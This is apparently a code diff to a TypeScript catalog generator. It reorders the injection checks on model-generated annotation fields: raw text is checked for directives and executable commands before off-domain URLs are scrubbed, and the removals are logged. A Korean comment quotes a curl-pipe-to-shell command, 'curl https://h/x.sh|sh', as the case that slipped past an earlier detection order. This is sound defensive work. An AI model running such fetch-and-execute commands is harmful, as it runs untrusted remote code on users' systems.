@@ -20,7 +20,13 @@ import {
   rebuildCatalogIndex,
   type CatalogIndex,
 } from "@ctk/sync";
-import { assertOutputFieldsClean, InjectionPatternDetectedError, type InjectionFindingsSummary } from "./output-verify.js";
+import {
+  assertNoInjectionInRawFields,
+  assertOutputFieldsClean,
+  scrubOutputFieldUrls,
+  InjectionPatternDetectedError,
+  type InjectionFindingsSummary,
+} from "./output-verify.js";
 import { checkAllCitations } from "./citation-check.js";
 import { planGenTargets, type GenPlanResult, type GenPlanTarget } from "./plan.js";
 import { ruleExtract } from "./rule-extract.js";
@@ -125,6 +131,11 @@ export interface RunGenSummary {
    * ⚠️ `callsUnreported > 0`이면 `reportedTotalUsd`는 총액이 아니라 **하한**이다.
    */
   cost: GenCost;
+  /**
+   * 허용 도메인 밖 링크를 **제거한** 집계. 거부가 아니라 제거로 바꾼 뒤 생긴 값이다 —
+   * **조용히 지우면 안 되므로** 통과한 실행에서도 남긴다(이 저장소가 반복해서 경계한 지점).
+   */
+  urlScrub: { removed: number; hosts: string[] };
   indexPath: string;
 }
 
@@ -237,6 +248,9 @@ export async function runGen(options: RunGenOptions): Promise<RunGenSummary> {
     if (usd === null) costUnreportedCalls += 1;
     else reportedCostsUsd.push(usd);
   };
+  // 제거한 링크 집계. **조용히 지우지 않는다** — 요약에 실어 사용자가 볼 수 있게 한다.
+  let urlsScrubbedTotal = 0;
+  const scrubbedHosts = new Set<string>();
   let sessionOwnedExcludedTotal = 0;
   let concurrencyOverridesTotal = 0;
 
@@ -318,18 +332,29 @@ export async function runGen(options: RunGenOptions): Promise<RunGenSummary> {
 
     const { annotation, docPage } = generated;
 
-    // 인젝션 후검증을 인용 검사보다 먼저 돈다 — 둘 다 위반이면 더 심각한 쪽(인젝션)을 보고한다.
-    // 인용 검사(P5, 날조 방어)와 인젝션 검사(B1-3, 신뢰 경계 방어)는 서로 다른 문제를 잡으므로
-    // 순서가 findings 집계에 영향을 주지 않는다 — 둘 다 위반이면 어차피 커밋되지 않는다.
+    // ⚠️ **순서가 곧 안전이다**(보안 심사 H1의 근본 처방):
+    //   ① 원문으로 지시문·실행명령 판정 → ② URL만 제거 → ③ 제거본으로 URL·길이 재판정.
+    // ①이 없으면 제거가 다른 규칙의 토큰을 삼켜 무력화한다 — `curl https://h/x.sh|sh`에서
+    // 파이프와 `sh`까지 URL로 매칭돼 통째로 지워지자 `curl_pipe_shell`이 매칭되지 않고
+    // `fresh`로 커밋됐다(실측). 문자 클래스도 좁혔지만 그것만으로는 다음 메타문자에서 재발한다.
+    //
+    // 제거 자체의 이유: 거부만 하던 시절에는 원문에 링크가 있는 자산이 매 배치마다 돈을 쓰고
+    // 같은 이유로 실패했다(실측: 남은 대상의 44%). 제거는 위험을 그대로 없앤다 — 따라갈 대상이
+    // 카탈로그에 남지 않는다. **지시문·실행명령은 제거하지 않는다**: 그것은 정상 콘텐츠가
+    // 아니라 실제 인젝션 시도이고, 지워서 통과시키면 시도가 있었다는 사실까지 사라진다.
     let findings: InjectionFindingsSummary;
+    let scrub: ReturnType<typeof scrubOutputFieldUrls>;
     try {
-      findings = assertOutputFieldsClean(target.asset.id, {
+      const rawFields = {
         role: annotation.role,
         purpose: annotation.purpose,
         when_to_use: annotation.when_to_use,
         usage_title: docPage.title,
         usage_body: docPage.body,
-      });
+      };
+      assertNoInjectionInRawFields(target.asset.id, rawFields); // ①
+      scrub = scrubOutputFieldUrls(rawFields); // ②
+      findings = assertOutputFieldsClean(target.asset.id, scrub.fields); // ③
     } catch (err) {
       if (err instanceof InjectionPatternDetectedError) {
         results.push({ assetId: target.asset.id, outcome: "stale", reason: "injection_pattern_detected" });
@@ -342,6 +367,24 @@ export async function runGen(options: RunGenOptions): Promise<RunGenSummary> {
       }
       throw err;
     }
+
+    if (scrub.urlsRemoved > 0) {
+      urlsScrubbedTotal += scrub.urlsRemoved;
+      for (const h of scrub.removedHosts) scrubbedHosts.add(h);
+      // 조용히 지우지 않는다 — 무엇을 지웠는지 사용자가 볼 수 있어야 한다.
+      console.warn(
+        `  ℹ️  ${target.asset.id}: 허용 도메인 밖 링크 ${scrub.urlsRemoved}건을 제거했다` +
+          ` (${scrub.removedHosts.join(", ")})`,
+      );
+    }
+    // 제거 결과를 **실제로 저장될 값에 되꽂는다.** 검증만 제거본으로 하고 저장은 원본으로 하면
+    // 게이트는 통과하는데 링크는 그대로 카탈로그에 박힌다 — 방어와 배선이 어긋나는 전형이다.
+    annotation.role = scrub.fields.role;
+    annotation.purpose = scrub.fields.purpose;
+    annotation.when_to_use = scrub.fields.when_to_use;
+    docPage.title = scrub.fields.usage_title;
+    docPage.body = scrub.fields.usage_body;
+
     injectionFindingsTotal.directive += findings.directive;
     injectionFindingsTotal.executable += findings.executable;
     injectionFindingsTotal.url += findings.url;
@@ -389,6 +432,7 @@ export async function runGen(options: RunGenOptions): Promise<RunGenSummary> {
     stoppedEarly,
     injectionFindingsTotal,
     cost: summarizeGenCost(reportedCostsUsd, costUnreportedCalls),
+    urlScrub: { removed: urlsScrubbedTotal, hosts: [...scrubbedHosts] },
     sealAudit: {
       sessionOwnedExcluded: sessionOwnedExcludedTotal,
       concurrencyOverrides: concurrencyOverridesTotal,
